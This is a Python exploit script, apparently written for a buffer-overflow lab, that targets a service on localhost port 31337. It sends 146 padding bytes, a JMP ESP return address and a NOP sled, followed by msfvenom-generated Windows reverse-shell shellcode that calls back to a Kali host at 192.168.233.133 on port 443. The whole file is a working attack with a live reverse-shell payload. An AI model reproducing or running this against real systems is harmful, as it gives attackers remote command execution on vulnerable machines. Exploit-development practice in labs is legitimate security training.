import socket

ip = "localhost"
port = 31337

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = ""
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars
#print(''.join(f'\\x{ord(c):02x}' for c in usechars))

# *** Kali VM IP Adress ***
# msfvenom -p 'windows/shell_reverse_tcp' LHOST=192.168.233.133 LPORT=443 -f 'python'
# Payload size: 324 bytes
buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
buf += "\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
buf += "\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
buf += "\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
buf += "\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
buf += "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
buf += "\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
buf += "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
buf += "\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
buf += "\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
buf += "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
buf += "\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
buf += "\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
buf += "\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
buf += "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
buf += "\xe9\x85\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
buf += "\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
buf += "\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
buf += "\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
buf += "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
buf += "\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
buf += "\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
buf += "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
buf += "\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
buf += "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\x88\x1A\x9B\x00" #"\xdf\x14\x50\x62" #625014DF - pos of "JMP ESP", "CALL ESP" or "PUSH ESP; RET"
padding = "\x90" * 16  #space to expand in

#payload = "A" * 256 #for knowing where the data is before finding badchars
#payload = usechars
payload = buf


postfix = "\x90" * 16  #space to expand in

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))

  #print(s.recv(1024))
  
  #This one uses a "login", really the user name
  #print("Sending user name")
  #s.send(bytes("username123", "latin-1"))

  #print(s.recv(1024))

  
  print("Sending ...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
